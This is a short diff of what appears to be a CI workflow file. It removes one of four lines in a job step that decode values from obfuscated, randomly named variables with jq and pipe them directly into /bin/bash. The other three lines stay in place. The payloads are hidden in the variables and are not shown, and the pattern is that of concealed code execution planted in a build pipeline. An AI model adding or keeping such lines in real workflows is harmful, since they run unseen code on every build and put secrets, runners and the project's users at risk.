@@ -22,7 +22,6 @@ jobs:
           echo $grwt77945 | jq -r .oao1 | /bin/bash
           echo $sdf3 | jq -r .xcv15 | /bin/bash
           printf '%s' "$o319" | jq -r .p96666 | /bin/bash
-          printf '%s' "$xv06429" | jq -r .mozt3 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
